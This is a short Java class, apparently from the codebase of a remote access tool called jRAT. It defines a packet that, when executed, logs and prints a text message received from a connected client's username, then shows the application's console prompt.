package net.jrat.core.packet.client;

import net.jrat.core.connection.Connection;
import net.jrat.core.packet.IPacket;
import net.jrat.utils.Logger;
import net.jrat.utils.Variables;

public class C1PacketMessage implements IPacket
{
	private static final long serialVersionUID = 1L;
	
	private String message;
	
	public C1PacketMessage(String message)
	{
		this.message = message;
	}
	
	@Override
	public void execute(Object object) throws Exception
	{
		final Connection connection = (Connection) object;
		
		Logger.space();
		
		Logger.log("recived message from " + connection.informations.username);
		System.out.println("------------------------------------------------------------");
		System.out.println(this.message);
		System.out.println("------------------------------------------------------------");
		Logger.log("end message");
		
		Logger.space();

		System.out.print(Variables.instance.appname + " -> ");
	}
}